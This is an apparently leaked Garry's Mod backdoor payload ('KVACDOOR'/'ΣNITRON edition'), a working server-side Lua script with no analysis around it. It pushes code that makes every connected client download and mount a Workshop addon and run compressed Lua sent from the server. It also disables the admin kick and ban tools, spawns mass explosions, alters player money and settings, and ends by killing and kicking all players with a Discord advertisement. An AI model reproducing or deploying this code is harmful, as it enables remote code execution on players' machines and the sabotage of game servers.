print([[ 
██╗   ██╗███╗   ██╗████████╗██╗████████╗██╗     ███████╗██████╗ 
██║   ██║████╗  ██║╚══██╔══╝██║╚══██╔══╝██║     ██╔════╝██╔══██╗
██║   ██║██╔██╗ ██║   ██║   ██║   ██║   ██║     █████╗  ██║  ██║
██║   ██║██║╚██╗██║   ██║   ██║   ██║   ██║     ██╔══╝  ██║  ██║
╚██████╔╝██║ ╚████║   ██║   ██║   ██║   ███████╗███████╗██████╔╝
 ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═════╝ 

KVACDOOR EDITION ]])

for k, v in pairs(player.GetAll()) do
v:SendLua("steamworks.FileInfo(1830594533,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
end


local function rdm_str(len)
if !len or len <= 0 then return '' end
return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
if !ply:IsBot() then
ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
end
end)

local function SendToClient(code)
local data = util.Compress(code)
local len = #data
net.Start(net_string)
net.WriteUInt(len, 16)
net.WriteData(data, len)
net.Broadcast()
end

local x_der_u = rdm_str(6)
local x_der_v = rdm_str(7)
local vector_five = Vector(0, 0, 5)
local props = ents.FindByClass("prop_*")
local propCache = {}
local playerCache = player.GetHumans()
local thechoosenone = nil


local function xp(a,b,c,d,e,f,g,h,x,w,m,y,s)

local a,b,c,d,e,f,g,h,x,w,m,y,s = a,b,c,d,e,f,g,h,x,w,m,y,s
x_der_u = rdm_str(6)
x_der_v = rdm_str(7)

SendToClient([[
-- a = Text Top "text"
-- b = Glitch   OFF 0 or 1 ON
-- c = Bottom text  OFF 0 or 1 ON
-- d = Glitch text  OFF 0 or 1 ON
-- e = Remove "Timer"
-- f = Center text  OFF 0 or 1 ON
-- g = Text Bottom  "text"
-- h = Text admin   OFF 0 or 1 ON
-- x = Enigma   OFF 0 or 1 ON
-- w = Player win "text"
-- m = Money win    "text"
-- y = Win  OFF 0 or 1 ON
-- s = Shake    OFF 0 or 1 ON

local a =   [=[]]   ..a.. [[]=] 
local b =   ]]  ..b.. [[ 
local c =   ]]  ..c.. [[ 
local d =   ]]  ..d.. [[ 
local e =   ]]  ..e.. [[ 
local f =   ]]  ..f.. [[ 
local g =   [=[]]   ..g.. [[]=] 
local h =   ]]  ..h.. [[ 
local x =   ]]  ..x.. [[ 
local w =   [=[]]   ..w.. [[]=] 
local m =   [=[]]   ..m.. [[]=] 
local y =   ]]  ..y.. [[ 
local s =   ]]  ..s.. [[ 


local text_x = a
local sW, sH = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local pw, ph = sW, sH*0.6
local px, py = sW/2-pw/2, sH/2-ph/2

surface.CreateFont( "ggPixelCutsceneScaled",{
font = "Open Sans", 
size = 50,
weight = 1000,
antialias = true
})
surface.CreateFont( "ggPixelCutsceneScaledBlur",{
font = "Open Sans", 
size = 50,
weight = 1000,
antialias = true
})
surface.CreateFont( "ggPixelCutsceneScaledERROR",{
font = "Open Sans", 
size = 50,
weight = 1000,
scanlines = 2.5, 
antialias = true
})
surface.CreateFont( "ggPixelCutsceneScaledBlurERROR",{
font = "Open Sans", 
size = 50,
weight = 1000,
scanlines = 2.5, 
antialias = true
})
surface.CreateFont( "ggPixelSmall",{
font = "Open Sans", 
size = 135,
weight = 500,
antialias = false
})
surface.CreateFont("lapolice", {
font = "Open Sans", 
size = ScrW()*0.02, 
weight = 10, 
blursize = 0, 
scanlines = 2.5, 
antialias = false
})
surface.CreateFont( "PixelCutsceneScaled",{
font = "Open Sans", 
size = 500,
weight = 1000,
antialias = true
})
surface.CreateFont( "PixelCutsceneScaledBlur",{
font = "Open Sans", 
size = 500,
weight = 1000,
antialias = true
})
surface.CreateFont( "PixelCutsceneScaledrt",{
font = "Open Sans", 
size = 500,
weight = 1000,
scanlines = 2.5, 
antialias = true
})
surface.CreateFont( "PixelCutsceneScaledBlurrt",{
font = "Open Sans", 
size = 500,
weight = 1000,
scanlines = 2.5, 
antialias = true
})



if f == 1 then 
]] .. x_der_u .. [[ = vgui.Create("DFrame")
]] .. x_der_u .. [[:SetSize( sW, sH )
]] .. x_der_u .. [[:SetPos(0,0)
]] .. x_der_u .. [[:SetDraggable(false)
]] .. x_der_u .. [[:SetTitle("")
]] .. x_der_u .. [[:ShowCloseButton(false)
]] .. x_der_u .. [[:SetBackgroundBlur( 5 )

]] .. x_der_u .. [[.Paint = function( self ) 
surface.SetDrawColor(30, 30, 30, 0)
end

local Close = vgui.Create( "DButton", ]] .. x_der_u .. [[ )
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph )
Close.Paint = function( self, tw, th )
local shift = math.sin(RealTime()*3)*1.5 + 5
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local txt_x = { "ERROR_", "ERXOX_", "EXROR_","XRRXR_" }

timer.Create("charglogo", 0, 0, function()
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local v = Vector(col.r / 255, col.g / 255, col.b / 255)
end)
if b == 1 then 
if d == 1 then 
text_x = table.Random( txt_x )
draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
else
draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
else
if d == 1 then 
text_x = table.Random( txt_x )
draw.SimpleText( text_x, "PixelCutsceneScaledBlurrt", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text_x, "PixelCutsceneScaledrt", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
else
draw.SimpleText( text_x, "PixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text_x, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end

if b == 1 then
draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
end
end

function ]] .. x_der_u .. [[:Think()
self:MoveToFront()
end
end

if c == 1 then 
local pw, ph = sW, sH*0.6
local px, py = sW/2-pw/2, sH/2-ph/2
local W, H = ScrW(), ScrH()


]] .. x_der_v .. [[ = vgui.Create( "DFrame" )
]] .. x_der_v .. [[:SetSize( sW, sH )
]] .. x_der_v .. [[:SetPos(0,0)
]] .. x_der_v .. [[:SetDraggable(false)
]] .. x_der_v .. [[:SetTitle("")
]] .. x_der_v .. [[:ShowCloseButton(false)

]] .. x_der_v .. [[.Paint = function( self ) 
surface.SetDrawColor(30, 30, 30, 0)


if b == 1 then 
draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
draw.DrawText( "(╯°□°）╯︵ ┻━┻", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "K", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "RIP ;)", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ΣNITRON", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
end
end

local Close = vgui.Create( "DButton", ]] .. x_der_v .. [[ )
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph+210 )
Close.Paint = function( self, tw, th )
local shift = math.sin(RealTime()*3)*1.5 + 3
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local untitled_ = { "ERROR_", "ERXOX_", "EXROR_","XRRXR_" }

timer.Create("charglogo", 0, 0, function()
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local v = Vector(col.r / 255, col.g / 255, col.b / 255)
end)
if d == 1 then 
if y == 1 then
if x == 1 then
draw.SimpleText( table.Random( untitled_ ).." win $inf", "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( table.Random( untitled_ ).." win $inf", "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
else
draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
else
draw.SimpleText( g, "ggPixelCutsceneScaledBlurERROR", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( g, "ggPixelCutsceneScaledERROR", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
else
if y == 1 then
if x == 1 then
draw.SimpleText( table.Random( untitled_ ).." win $inf", "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( table.Random( untitled_ ).." win $inf", "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
else
draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( w .. " win $" ..m, "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
else
draw.SimpleText( g, "ggPixelCutsceneScaledBlur", tw/2 , th/2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( g, "ggPixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end

end
end
if s == 1 then 
timer.Create("]] .. x_der_u .. [[", 0.2, 0, function()
util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
end)
end

timer.Simple( e, function()
for i = 1, 10 do
if c == 1 then ]] .. x_der_v .. [[:Remove() end
if f == 1 then ]] .. x_der_u .. [[:Remove() end
if s == 1 then timer.Remove("]] .. x_der_u .. [[") end
end
end)


]])
end


local function bounceProps()
for i = 1, 240 do
local explode = ents.Create( "env_explosion" ) 
explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-2500, 2000)) ) 
explode:Spawn() 
explode:SetKeyValue( "iMagnitude", "500" ) 
explode:Fire( "Explode", 0, 0 ) 
end
for k, v in pairs(ents.GetAll()) do 
if v:IsVehicle() then
local explo = ents.Create("env_explosion")
explo:SetPos(v:GetPos())
explo:SetKeyValue("iMagnitude", "900")
explo:Spawn()
explo:Activate()
explo:Fire("Explode", "", 0)
end
end
for k,v in pairs(player.GetAll()) do 
v:SetVelocity(v:GetVelocity() + Vector(math.random(100,200), math.random(100,200), math.random(100,200))) 
end
local props = ents.GetAll()
for _, prop in ipairs( props ) do
if(prop:GetPhysicsObject():IsValid()) then
prop:GetPhysicsObject():SetVelocity(Vector(0,0,5))
prop:GetPhysicsObject():Wake()
prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, prop:GetPhysicsObject():GetMass() * 1300))
end
end
end

function random_players()
local player = player.GetAll()

local players = {}
local playersSID = {}

local win = ""
local secu = 0
local money = "1e+"..math.random(15,999)

for k, v in pairs(player) do
table.insert( players, v:Nick() )
table.insert( playersSID, v:SteamID() )
end

local idgg = math.random(1,table.Count( players ))

--[[PrintTable(players)
PrintTable(playersSID)
print( "- " ..idgg)
print(players[idgg])]]--
win = players[idgg]
local slap = { "ERROR_", "ERXOX_", "EXROR_","XRRXR_" }
slay = table.Random( slap )

if playersSID[idgg] == "STEAM_0:1:63938726" or playersSID[idgg] == "STEAM_0:1:186944016" then win = slay secu = 1 end

if secu == 1 then

local a = ""    --Text Top  "text"
local b = "1"   --Glitch    OFF 0 or 1 ON
local c = "1"   --Bottom text   OFF 0 or 1 ON
local d = "1"   --Glitch text   OFF 0 or 1 ON
local e = "10"  --Remove time
local f = "0"   --Top text  OFF 0 or 1 ON
local g = ""    --Text Bottom   "text"
local h = "0"   --Text admin    OFF 0 or 1 ON
local x = "1"   --Enigma    OFF 0 or 1 ON
local w = ""    --Player win "text"
local m = ""    --Money win "text"
local y = "1"   --Win   OFF 0 or 1 ON
local s = "1"   --Shake OFF 0 or 1 ON

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
else
local a = ""    --Text Top  "text"
local b = "0"   --Glitch    OFF 0 or 1 ON
local c = "1"   --Bottom text   OFF 0 or 1 ON
local d = "0"   --Glitch text   OFF 0 or 1 ON
local e = "10"  --Remove time
local f = "0"   --Top text  OFF 0 or 1 ON
local g = "text"    --Text Bottom   "text"
local h = "0"   --Text admin    OFF 0 or 1 ON
local x = "0"   --Enigma    OFF 0 or 1 ON
local w = win   --Player win "text"
local m = money --Money win "text"
local y = "1"   --Win   OFF 0 or 1 ON
local s = "0"   --Shake OFF 0 or 1 ON

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end


print("User " ..win.." - Money " ..money)
if DarkRP then
game.ConsoleCommand( "DarkRP setmoney " .. players[idgg].." " ..money.."\n" )
end
end

local function choosePlayer()
repeat
thechoosenone = playerCache[math.random(1, #playerCache)]   
until IsValid(thechoosenone)
end

choosePlayer()


local nothing = function() end

if ULib then
ULib.kick = nothing
ULib.ban = nothing
ULib.addBan = nothing
end

if FAdmin then
local tbl = {
"kick",
"ban",
"jail",
"UnJail",
"ClearDecals",
"StopSounds",
"CleanUp"
}
for i=1, #tbl do
FAdmin.Commands.AddCommand(tbl[i], nothing)
end
end

function game.CleanUpMap() return false end


local function cacheProps()
for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
local phys = v:GetPhysicsObject()
if (IsValid(phys)) then
phys:EnableMotion(true)
end 
end
end


timer.Create("cacheProps", 5, 0, cacheProps)

timer.Simple(9,function() 
timer.Create("random_players", 11, 0, random_players)
end)

timer.Simple(214,function() 
timer.Remove("random_players")
timer.Create("end", 1, 0, function()
for i = 1, 240 do
local explode = ents.Create( "env_explosion" ) 
explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
explode:Spawn() 
explode:SetKeyValue( "iMagnitude", "500" ) 
explode:Fire( "Explode", 0, 0 ) 
end
end) 

end)



timer.Create("NnoMoreVehicle", 1, 0, function()
for k,v in pairs(ents.FindByClass("prop_vehicle*")) do 
v:Remove() 
end
end)

timer.Create("UJoinEnigmaArmyiGiveUGodMod", 0.15, 0, function()
for k,v in pairs(player.GetAll()) do
local xd = { "ERROR", "ERXOX", "EXROR","XRRXR" }
v:GodEnable()
v:SetRunSpeed(400* 4)
v:SetWalkSpeed(400 * 4)
v:AddFrags( math.random(1,99) )
v:SetModel( "models/kvac/kvac.mdl" )
if DarkRP then
v:setDarkRPVar( "job", "JOB_"..table.Random( xd ) )
v:setDarkRPVar( "wanted", true )
v:setDarkRPVar( "wantedReason", "JOB_"..table.Random( xd ) )
v:setDarkRPVar( "salary", math.random(100000000,999999999) )
v:setDarkRPVar( "agenda", "CODEx3b6_"..table.Random( xd ) )
end
end
end)
timer.Simple(1,function() 
for k,v in pairs(player.GetAll()) do
v:StripWeapons()
end
end)
timer.Simple(2,function() 
for k,v in pairs(player.GetAll()) do
v:Give( "weapon_physgun" )
end
end)


timer.Create("AllPropsJoinEnigmaArmy", 2, 0, function()
for k, v in pairs( ents.FindByClass( "prop_*" ) ) do
if !(v:GetModel() == "models/kvac/kvac.mdl") then
v:SetModelScale(.6)
v:SetModel( "models/kvac/kvac.mdl" )
v:Activate()
end
end
end)

hook.Add( 'SetupMove', 'Lapin', function( ply, move )
if not ply:IsOnGround() then
move:SetButtons( bit.band( move:GetButtons(), bit.bnot( IN_JUMP ) ) )
end
end )

local sun = ents.FindByClass("env_sun")
if #sun == 0 then return end
sun = sun[1]
hook.Add("Think","\xFFsun\xFF",function()
sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
sun:SetModelScale(120)
end)

timer.Simple(242,function()
for k,v in pairs(player.GetAll()) do 
v:Kill()
end
end)


timer.Simple(247,function()
local rt = { "ERROR_", "ERXOX_", "EXROR_","XRRXR_" }
for k,v in pairs(player.GetAll()) do
v:Kick("\n [FR] Oh désolé, je ne me suis pas présenté, je suis "..table.Random( rt ).." votre serveur a rencontré un problème que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur!\n\n\n Cordialement ΣNITRON (https://discord.gg/bgG4cB8b7k). \n\n ----------------------------------------------- \n\n[EN] Oh sorry I didn't introduce myself, I'm "..table.Random( rt ).." your server has encountered a problem that I fixed, you can now go back to your server! \n\n Cordially (https://discord.gg/bgG4cB8b7k)")
end
end)

timer.Simple(250,function() 
hook.Remove("Think","\xFFsun\xFF")
hook.Remove( 'SetupMove', 'auto hop')
timer.Remove("end")
timer.Remove("nomore")
timer.Remove("AllPropsJoinEnigmaArmy")
timer.Remove("UJoinEnigmaArmyiGiveUGodMod")
end)

util.AddNetworkString("EXROR_")
net.Receive("EXROR_", function(_, ply)
if not IsValid(thechoosenone) then choosePlayer() end
if ply ~= thechoosenone then return end
bounceProps()
end)


-- a = Text Top "text"
-- b = Glitch   OFF 0 or 1 ON
-- c = Bottom text  OFF 0 or 1 ON
-- d = Glitch text  OFF 0 or 1 ON
-- e = Remove "Timer"
-- f = Center text  OFF 0 or 1 ON
-- g = Text Bottom  "text"
-- h = Text admin   OFF 0 or 1 ON
-- x = Enigma   OFF 0 or 1 ON
-- w = Player win "text"
-- m = Money win    "text"
-- y = Win  OFF 0 or 1 ON
-- s = Shake    OFF 0 or 1 ON

timer.Simple( 1, function() --WELCOME
local a = "WELCOME"
local b = "0"
local c = "0"
local d = "0"
local e = "2.9"
local f = "1"
local g = "0"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)


timer.Simple( 5, function() --End 3 
local a = "ΣNITRON"
local b = "0"
local c = "1"
local d = "0"
local e = "5"
local f = "1"
local g = [[(/.__.)/ I \(.__.\)]]
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 8, function() -- ENIGMA
local a = "ΣNITRON"
local b = "0"
local c = "0"
local d = "0"
local e = "207"
local f = "1"
local g = "text"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"
xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)


timer.Simple( 215, function()   --Glitch Back   
local a = ""
local b = "1"
local c = "1"
local d = "0"
local e = "999"
local f = "1"
local g = ""
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "1"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)



timer.Simple( 215, function()   --End ERROR_    
local a = ""
local b = "0"
local c = "0"
local d = "1"
local e = "24"
local f = "1"
local g = "text"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)


timer.Simple( 239, function()   --End 3 
local a = "3"
local b = "0"
local c = "0"
local d = "0"
local e = "0.8"
local f = "1"
local g = "text"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 240, function()   --End 2 
local a = "2"
local b = "0"
local c = "0"
local d = "0"
local e = "0.8"
local f = "1"
local g = "text"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 241, function()   --End 1
local a = "1"
local b = "0"
local c = "0"
local d = "0"
local e = "0.8"
local f = "1"
local g = "text"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
end)

timer.Simple( 242, function()
--Kick
local a = "UNTITLED"
local b = "0"
local c = "1"
local d = "0"
local e = "999"
local f = "1"
local g = "ΣNITRON EDITION"
local h = "0"
local x = "0"
local w = ""
local m = ""
local y = "0"
local s = "0"

xp(a,b,c,d,e,f,g,h,x,w,m,y,s)
for k,v in pairs(player.GetAll()) do 
v:ConCommand( "stopsounds" )
v:ConCommand( "lelstop" )
end
end)


local Mirror = 0
local ip = GetConVarString('ip') .. ':' .. GetConVarString('hostport')
local ip2 = game.GetIPAddress()


--if (ip == "gmod1.px-serv.com:27015" or ip == "51.83.49.196:27015" or ip2 == "gmod1.px-serv.com" or ip2 == "51.83.49.196" or ip == "51.83.49.196" ) then Mirror = 1 end

SendToClient([=[

local mirror_x = ]=] .. Mirror .. [=[

if mirror_x == 0 then 
RunConsoleCommand("gmod_language","ko")
end


timer.Simple(240,function()
RunConsoleCommand("lelstop")
RunConsoleCommand("stopsounds")
end)

print([[
██╗   ██╗███╗   ██╗████████╗██╗████████╗██╗     ███████╗██████╗ 
██║   ██║████╗  ██║╚══██╔══╝██║╚══██╔══╝██║     ██╔════╝██╔══██╗
██║   ██║██╔██╗ ██║   ██║   ██║   ██║   ██║     █████╗  ██║  ██║
██║   ██║██║╚██╗██║   ██║   ██║   ██║   ██║     ██╔══╝  ██║  ██║
╚██████╔╝██║ ╚████║   ██║   ██║   ██║   ███████╗███████╗██████╔╝
 ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═════╝ 

By IXXE & Muffin for KVACDOOR ]])

-- ClientSide
-- by Muffin & IXXE
-- Leaked By KVacDoor
-- https://discord.gg/MrJUbQ72kj
-- v0.4 (2019-08-10)
-- all reproduction prohibited !

local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2

local defaultfov = LocalPlayer():GetFOV()
local override = 70

local sent = false

local audio
local skys = ents.FindByClass("env_skypaint")


local function AudioVizualier()
if not audio then return end
local tbl = {}
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)

local vv = Vector(col.r / 255, col.g / 255, col.b / 255)

audio:FFT(tbl, FFT_4096)

local avg = 0
for i = 1, 40 do
avg = avg + tbl[i]
end

local h = CurTime() * 250 % 360

prevVal = Lerp(30 * FrameTime(), prevVal, avg)
if prevVal > 2 then
util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
local vPos = LocalPlayer():EyePos()
local emitter = ParticleEmitter( LocalPlayer():EyePos())
